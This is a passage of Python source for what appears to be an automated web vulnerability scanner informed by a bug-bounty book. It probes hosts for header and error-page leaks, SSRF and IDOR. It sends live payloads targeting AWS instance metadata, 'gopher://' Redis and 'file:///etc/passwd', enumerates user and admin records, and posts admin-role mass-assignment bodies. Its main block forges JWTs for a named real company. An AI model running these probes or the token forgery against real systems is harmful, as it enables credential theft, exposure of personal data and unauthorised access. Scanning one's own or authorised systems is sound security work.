            'severity': 'INFO',
            'title': 'CMS_GENERATOR_HEADER',
            'detail': (
                f'CMS_GENERATOR_HEADER — X-Generator header discloses CMS: '
                f'"{xgen}"'
            ),
            'host': host,
            'port': port,
        })

    # Missing security headers (check on root response)
    missing = []
    for hdr_name in ('X-Frame-Options', 'Content-Security-Policy'):
        if not headers.get(hdr_name):
            missing.append(hdr_name)
    if missing:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'MISSING_SECURITY_HEADERS',
            'detail': (
                f'MISSING_SECURITY_HEADERS — absent on root response: '
                f'{", ".join(missing)}'
            ),
            'host': host,
            'port': port,
        })

    # ── Error page probing ───────────────────────────────────────────────────
    _, err_body = _fetch('/nonexistent-page-ablation-probe-12345')
    if err_body:
        # Generic stack-trace / file-path disclosure
        if re.search(r'(?:Traceback|at [A-Z][a-zA-Z]+\.[a-zA-Z]+\(.*\.(?:py|java|cs|go|rb):\d+\)'
                     r'|File ".*\.py", line \d+)', err_body):
            snippet = err_body[:300].replace('\n', ' ')
            findings.append({
                'severity': 'HIGH',
                'title': 'ERROR_PAGE_STACK_TRACE',
                'detail': (
                    f'ERROR_PAGE_STACK_TRACE — error page leaks stack trace '
                    f'or internal file paths; snippet: {snippet!r}'
                ),
                'host': host,
                'port': port,
            })

        # PHP fatal error disclosure
        if re.search(r'Fatal error.*in /[^\s]+\.php', err_body):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'PHP_ERROR_DISCLOSURE',
                'detail': (
                    'PHP_ERROR_DISCLOSURE — PHP fatal error with internal '
                    'file path visible in error page'
                ),
                'host': host,
                'port': port,
            })

        # ASP.NET yellow screen of death
        if 'Microsoft.NET' in err_body and 'Stack Trace' in err_body:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASPNET_YSOD',
                'detail': (
                    'ASPNET_YSOD — ASP.NET Yellow Screen of Death detected; '
                    'stack trace and internal paths exposed'
                ),
                'host': host,
                'port': port,
            })

        # Django debug page
        if 'DEBUG = True' in err_body or 'INSTALLED_APPS' in err_body:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'DJANGO_DEBUG_MODE',
                'detail': (
                    'DJANGO_DEBUG_MODE — Django debug page detected; '
                    'DEBUG=True exposes settings, SQL queries, and local '
                    'variables'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_ssrf_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """
    Detect Server-Side Request Forgery (SSRF) vulnerability surface.
    Informed by Bug Bounty Bootcamp Chapter 13 (SSRF): URL parameter
    injection into server-side fetch operations, cloud metadata access via
    IMDS, blind SSRF via timing differentials, and alternate protocol
    scheme abuse (gopher/file).

    Checks:
      - AWS IMDS markers in response body     → CRITICAL SSRF_CLOUD_METADATA_ACCESS
      - Localhost IP reflected in 200 body    → HIGH    SSRF_LOCALHOST_ACCESS
      - Timing differential > 2s (blind)      → HIGH    SSRF_BLIND_TIMING
      - Internal IP pattern in 200 body       → CRITICAL SSRF_INTERNAL_HOST_FETCH
      - Arbitrary external domain fetch       → MEDIUM  SSRF_DNS_REBIND_SURFACE
      - gopher:// or file:// scheme accepted  → CRITICAL SSRF_ALTERNATE_SCHEME

    Returns list of {severity, title, detail, host, port}.
    """
    import urllib.parse

    findings = []
    scheme = 'https' if port == 443 else 'http'

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    ssrf_params = [
        'url', 'redirect', 'path', 'dest', 'uri',
        'source', 'href', 'link', 'feed', 'host', 'proxy',
    ]
    probe_paths = [
        '/', '/api/fetch', '/api/proxy', '/api/url',
        '/fetch', '/proxy', '/request', '/webhook',
    ]
    localhost_payload = 'http://127.0.0.1/'
    imds_payload = 'http://169.254.169.254/latest/meta-data/'
    imds_markers = ['ami-id', 'instance-id', 'security-credentials', 'iam/security']
    internal_ip_re = re.compile(
        r'\b(127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|'
        r'172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)\b'
    )

    def _fetch(url_str, data=None, extra_headers=None):
        try:
            req = urllib.request.Request(url_str, data=data)
            req.add_header('User-Agent', 'Mozilla/5.0')
            if extra_headers:
                for k, v in extra_headers.items():
                    req.add_header(k, v)
            if url_str.startswith('https'):
                handler = urllib.request.HTTPSHandler(context=ssl_ctx)
            else:
                handler = urllib.request.HTTPHandler()
            opener = urllib.request.build_opener(handler)
            t0 = time.monotonic()
            resp = opener.open(req, timeout=timeout)
            elapsed = time.monotonic() - t0
            body = resp.read(16384).decode('utf-8', errors='replace')
            return resp.status, body, elapsed
        except urllib.error.HTTPError as exc:
            body = exc.read(4096).decode('utf-8', errors='replace')
            return exc.code, body, 0.0
        except Exception:
            return None, '', 0.0

    seen_titles = set()

    def _add(severity, title, detail):
        if title not in seen_titles:
            seen_titles.add(title)
            findings.append({
                'severity': severity,
                'title': title,
                'detail': detail,
                'host': host,
                'port': port,
            })

    # ── URL parameter injection with IMDS and localhost payloads ──────────────
    for path in probe_paths:
        base_url = f"{scheme}://{host}:{port}{path}"
        for param in ssrf_params:

            # GET with IMDS payload
            imds_qs = urllib.parse.urlencode({param: imds_payload})
            status, body, _ = _fetch(f"{base_url}?{imds_qs}")
            if status == 200:
                if any(m in body for m in imds_markers):
                    _add(
                        'CRITICAL',
                        'SSRF_CLOUD_METADATA_ACCESS',
                        f'SSRF_CLOUD_METADATA_ACCESS — AWS IMDS content returned '
                        f'via {param}= at {path}; cloud metadata fetched '
                        f'server-side',
                    )
                elif internal_ip_re.search(body):
                    _add(
                        'CRITICAL',
                        'SSRF_INTERNAL_HOST_FETCH',
                        f'SSRF_INTERNAL_HOST_FETCH — internal IP pattern in 200 '
                        f'response body via {param}= at {path}; server is '
                        f'fetching internal hosts',
                    )

            # GET with localhost payload — capture elapsed for blind timing
            local_qs = urllib.parse.urlencode({param: localhost_payload})
            t0 = time.monotonic()
            status_loc, body_loc, _ = _fetch(f"{base_url}?{local_qs}")
            elapsed_loc = time.monotonic() - t0

            if status_loc == 200 and (
                '127.0.0.1' in body_loc or internal_ip_re.search(body_loc)
            ):
                _add(
                    'HIGH',
                    'SSRF_LOCALHOST_ACCESS',
                    f'SSRF_LOCALHOST_ACCESS — localhost IP reflected in 200 '
                    f'body via {param}= at {path}',
                )

            # Timing differential vs. external domain (blind SSRF indicator)
            ext_qs = urllib.parse.urlencode({param: 'http://www.example.com/'})
            t0 = time.monotonic()
            _fetch(f"{base_url}?{ext_qs}")
            elapsed_ext = time.monotonic() - t0

            if abs(elapsed_loc - elapsed_ext) > 2.0:
                _add(
                    'HIGH',
                    'SSRF_BLIND_TIMING',
                    f'SSRF_BLIND_TIMING — {abs(elapsed_loc - elapsed_ext):.1f}s '
                    f'timing differential between localhost and external payloads '
                    f'via {param}= at {path}; possible blind SSRF',
                )

            # POST with IMDS payload
            post_data = urllib.parse.urlencode({param: imds_payload}).encode()
            status_p, body_p, _ = _fetch(
                base_url, data=post_data,
                extra_headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
            )
            if status_p == 200 and any(m in body_p for m in imds_markers):
                _add(
                    'CRITICAL',
                    'SSRF_CLOUD_METADATA_ACCESS',
                    f'SSRF_CLOUD_METADATA_ACCESS — AWS IMDS content returned via '
                    f'POST {param}= at {path}',
                )

            if len(seen_titles) >= 3:
                break  # enough signal from this path

    # ── Arbitrary external domain fetch (DNS rebinding surface) ───────────────
    for path in probe_paths[:3]:
        base_url = f"{scheme}://{host}:{port}{path}"
        for param in ssrf_params[:3]:
            qs = urllib.parse.urlencode({param: 'http://ssrf-canary.example.com/'})
            status, body, _ = _fetch(f"{base_url}?{qs}")
            if status == 200 and len(body) > 100:
                _add(
                    'MEDIUM',
                    'SSRF_DNS_REBIND_SURFACE',
                    f'SSRF_DNS_REBIND_SURFACE — server appears to fetch arbitrary '
                    f'external domains via {param}= at {path}; DNS rebinding '
                    f'attack surface present',
                )
            if 'SSRF_DNS_REBIND_SURFACE' in seen_titles:
                break

    # ── Alternate scheme probes (gopher, file) ────────────────────────────────
    alt_payloads = [
        ('gopher', 'gopher://127.0.0.1:6379/_PING%0D%0A'),
        ('file', 'file:///etc/passwd'),
    ]
    for scheme_name, alt_payload in alt_payloads:
        for path in probe_paths[:2]:
            base_url = f"{scheme}://{host}:{port}{path}"
            for param in ssrf_params[:4]:
                qs = urllib.parse.urlencode({param: alt_payload})
                status, body, _ = _fetch(f"{base_url}?{qs}")
                if status == 200 and (
                    'root:' in body
                    or '+OK' in body
                    or scheme_name in body.lower()
                ):
                    _add(
                        'CRITICAL',
                        'SSRF_ALTERNATE_SCHEME',
                        f'SSRF_ALTERNATE_SCHEME — {scheme_name}:// URI processed '
                        f'by server via {param}= at {path}; alternate protocol '
                        f'SSRF confirmed',
                    )
                if 'SSRF_ALTERNATE_SCHEME' in seen_titles:
                    break

    return findings


def probe_idor_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """
    Detect Insecure Direct Object Reference (IDOR) vulnerability surface.
    Informed by Bug Bounty Bootcamp Chapter 10 (IDOR): predictable numeric
    and GUID ID enumeration, unauthenticated object access, admin endpoint
    exposure, PII disclosure via direct reference, and mass assignment via
    privilege field injection in POST bodies.

    Checks:
      - Different body sizes for sequential IDs  → HIGH    IDOR_DIFFERENT_OBJECTS_RETURNED
      - Unauthenticated user data at ID 1        → CRITICAL IDOR_UNAUTH_USER_DATA
      - Admin endpoint returns data unauthed     → CRITICAL IDOR_ADMIN_ENDPOINT_UNAUTH
      - PII fields in unauthenticated response   → CRITICAL IDOR_PII_DISCLOSURE
      - Role field in POST response (mass assign)→ CRITICAL MASS_ASSIGNMENT_ROLE_ESCALATION

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    scheme = 'https' if port == 443 else 'http'

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    test_ids = [1, 2, 3, 100, 1000]
    guid_id = '00000000-0000-0000-0000-000000000001'
    object_endpoints = [
        '/api/users',
        '/api/profile',
        '/api/orders',
        '/api/files',
        '/api/documents',
    ]
    admin_endpoints = [
        '/api/admin/users',
        '/api/admin/orders',
        '/api/admin/files',
    ]
    pii_re = re.compile(
        r'"(email|username|phone|ssn|dob|password|credit_card|address|'
        r'first_name|last_name|full_name)"\s*:',
        re.IGNORECASE,
    )
    role_re = re.compile(
        r'"(role|is_admin|admin|privilege|permission)"\s*:',
        re.IGNORECASE,
    )

    def _fetch(path, data=None, method=None, extra_headers=None):
        url = f"{scheme}://{host}:{port}{path}"
        try:
            req = urllib.request.Request(url, data=data, method=method)
            req.add_header('User-Agent', 'Mozilla/5.0')
            req.add_header('Accept', 'application/json, */*')
            if extra_headers:
                for k, v in extra_headers.items():
                    req.add_header(k, v)
            if url.startswith('https'):
                handler = urllib.request.HTTPSHandler(context=ssl_ctx)
            else:
                handler = urllib.request.HTTPHandler()
            opener = urllib.request.build_opener(handler)
            resp = opener.open(req, timeout=timeout)
            body = resp.read(8192).decode('utf-8', errors='replace')
            return resp.status, body, len(body)
        except urllib.error.HTTPError as exc:
            body = exc.read(2048).decode('utf-8', errors='replace')
            return exc.code, body, 0
        except Exception:
            return None, '', 0

    seen_titles = set()

    def _add(severity, title, detail):
        if title not in seen_titles:
            seen_titles.add(title)
            findings.append({
                'severity': severity,
                'title': title,
                'detail': detail,
                'host': host,
                'port': port,
            })

    # ── Sequential numeric ID enumeration ────────────────────────────────────
    for endpoint in object_endpoints:
        prev_size = None

        for obj_id in test_ids:
            path = f"{endpoint}/{obj_id}"
            status, body, size = _fetch(path)

            if status != 200 or size < 50:
                prev_size = None
                continue

            # Unauthenticated user data at the first object
            if obj_id == 1 and pii_re.search(body):
                _add(
                    'CRITICAL',
                    'IDOR_UNAUTH_USER_DATA',
                    f'IDOR_UNAUTH_USER_DATA — unauthenticated GET {path} '
                    f'returned PII fields without authentication',
                )

            # PII visible in any unauthenticated response
            if pii_re.search(body):
                _add(
                    'CRITICAL',
                    'IDOR_PII_DISCLOSURE',
                    f'IDOR_PII_DISCLOSURE — PII fields (email/username/phone/…) '
                    f'visible in unauthenticated response at {path}',
                )

            # Different body sizes across sequential IDs = distinct objects
            if prev_size is not None and abs(size - prev_size) > 20:
                _add(
                    'HIGH',
                    'IDOR_DIFFERENT_OBJECTS_RETURNED',
                    f'IDOR_DIFFERENT_OBJECTS_RETURNED — sequential IDs at '
                    f'{endpoint} return objects of different sizes '
                    f'({prev_size} vs {size} bytes); direct object reference '
                    f'enumeration confirmed',
                )

            prev_size = size

        # GUID-style probe for the same endpoint
        guid_path = f"{endpoint}/{guid_id}"
        status, body, size = _fetch(guid_path)
        if status == 200 and size > 50:
            _add(
                'HIGH',
                'IDOR_DIFFERENT_OBJECTS_RETURNED',
                f'IDOR_DIFFERENT_OBJECTS_RETURNED — GUID object at {guid_path} '
                f'accessible unauthenticated; predictable GUID enumeration '
                f'surface present',
            )
            if pii_re.search(body):
                _add(
                    'CRITICAL',
                    'IDOR_PII_DISCLOSURE',
                    f'IDOR_PII_DISCLOSURE — PII fields visible in unauthenticated '
                    f'GUID response at {guid_path}',
                )

    # ── Admin endpoint enumeration ─────────────────────────────────────────────
    for endpoint in admin_endpoints:
        for obj_id in [1, 2, 3]:
            path = f"{endpoint}/{obj_id}"
            status, body, size = _fetch(path)
            if status == 200 and size > 50:
                _add(
                    'CRITICAL',
                    'IDOR_ADMIN_ENDPOINT_UNAUTH',
                    f'IDOR_ADMIN_ENDPOINT_UNAUTH — admin endpoint {path} '
                    f'returned data without authentication; access control absent',
                )
                if pii_re.search(body):
                    _add(
                        'CRITICAL',
                        'IDOR_PII_DISCLOSURE',
                        f'IDOR_PII_DISCLOSURE — PII visible in unauthenticated '
                        f'admin endpoint response at {path}',
                    )
                if 'IDOR_ADMIN_ENDPOINT_UNAUTH' in seen_titles:
                    break

    # ── Mass assignment: POST with privilege escalation fields ─────────────────
    escalation_payloads = [
        '{"role":"admin","is_admin":true,"privilege":"superuser"}',
        '{"role":"superuser","admin":true}',
        '{"is_admin":true}',
    ]
    post_endpoints = [
        '/api/users',
        '/api/users/me',
        '/api/profile',
        '/api/account',
    ]
    for endpoint in post_endpoints:
        for payload in escalation_payloads:
            status, body, _ = _fetch(
                endpoint,
                data=payload.encode(),
                method='POST',
                extra_headers={'Content-Type': 'application/json'},
            )
            if status == 200 and role_re.search(body):
                _add(
                    'CRITICAL',
                    'MASS_ASSIGNMENT_ROLE_ESCALATION',
                    f'MASS_ASSIGNMENT_ROLE_ESCALATION — POST to {endpoint} '
                    f'with privilege fields returned a role field in response; '
                    f'mass assignment may allow privilege escalation',
                )
            if 'MASS_ASSIGNMENT_ROLE_ESCALATION' in seen_titles:
                break

    return findings


if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: jwt_crypto.py <jwt_token>")
        print("       jwt_crypto.py --forge <sub> <email>")
        sys.exit(1)

    analyzer = CryptoAnalyzer()

    if sys.argv[1] == '--forge':
        sub   = sys.argv[2] if len(sys.argv) > 2 else 'admin'
        email = sys.argv[3] if len(sys.argv) > 3 else f'{sub}@macstadium.com'
        token = analyzer.forge_macstadium_jwt(sub, email)
        print(f'Forged token:\n{token}')
    else:
        token = sys.argv[1]
        result = analyzer.analyze_jwt(token)
        print(json.dumps(result, indent=2))

    print(analyzer.report())
